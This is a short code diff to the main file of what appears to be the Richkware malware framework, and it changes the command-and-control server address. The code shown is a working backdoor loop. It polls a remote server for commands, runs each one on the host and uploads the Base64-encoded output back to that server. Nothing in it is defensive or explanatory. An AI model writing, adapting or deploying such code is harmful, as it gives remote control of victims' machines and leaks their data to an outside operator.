@@ -9,17 +9,17 @@
 
 int main() {
     // with RichkwareManagerServer
-    Richkware richkware("Richk", "richktest", "172.24.30.47", "8080", "er@fv.it");
+    Richkware richkware("Richk", "richktest", "172.24.23.102", "8080", "er@fv.it");
     // without RichkwareManagerServer
     //Richkware richkware("Richk","richktest");
 
     // PUT YOUR CODE HERE
 //    richkware.network.fetchCommand("172.17.238.81", "8080", "er@fv.it", "Richk");
 //    richkware.executeCommands();
-    std::vector <std::string> commands = richkware.getCommands("172.24.30.47", "8080");
+    std::vector <std::string> commands = richkware.getCommands("172.24.23.102", "8080");
     while (true) {
         while (commands.size() == 1 && commands.at(0) == "") {
-            commands = richkware.getCommands("172.24.30.47", "8080");
+            commands = richkware.getCommands("172.24.23.102", "8080");
             std::cout << "waiting for commands..." << std::endl;
             Sleep(5000);
         }
@@ -37,7 +37,7 @@ int main() {
         }
         response.append(/*Base64_encode(*/richkware.executeCommand(commands.at(commands.size() - 1)))/*)*/;
         richkware.uploadCommandsResponse(Base64_encode((const unsigned char *) response.c_str(), response.size()),
-                                         "172.24.30.47", "8080");
+                                         "172.24.23.102", "8080");
         std::cout << "response uploaded! (" << response << ")" << std::endl;
         commands.clear();
         system("PAUSE");
